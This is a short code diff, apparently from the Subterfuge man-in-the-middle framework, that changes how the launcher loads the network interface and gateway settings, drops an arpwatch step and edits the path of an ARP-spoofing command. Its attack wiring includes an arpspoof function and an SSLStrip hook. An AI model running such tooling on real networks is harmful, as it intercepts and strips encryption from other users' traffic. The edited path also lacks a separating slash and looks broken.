@@ -15,21 +15,11 @@ settings.configure(DATABASE_ENGINE="sqlite3",
 from django.db import models
 from main.models import *
 
-	#Read in Config File
-f = open(os.path.dirname(__file__) + '/subterfuge.conf', 'r')
-config = f.readlines()
-interface = config[15].rstrip("\n")
-gateway = config[17].rstrip("\n")
-routermac = config[19].rstrip("\n")
-attackerip = config[21].rstrip("\n")
+	#Get Globals from Database
+for settings in setup.objects.all():
+	interface     = settings.iface
+	gateway       = settings.gateway
 
-try:
-		#Run up arpwatch
-	os.system("python " + os.path.dirname(__file__) + "/utilities/arpwatch.py " + gateway + " " +  routermac + " " + attackerip + " &")
-	
-except:
-	print "Encountered an error configuring arpwatch. Terminating..."
-	print "Launching attack with standard configuration options."
 try:
 
 	def main():
@@ -93,7 +83,7 @@ try:
 	
 	#arpspoof tooled through Subterfuge:
 	def arpspoof():
-		command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/arpmitm.py ' + gateway + ' &'
+		command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + 'utilities/arpmitm.py ' + gateway + ' &'
 		os.system(command)
 	
 	#SSLStrip tooled through Subterfuge:
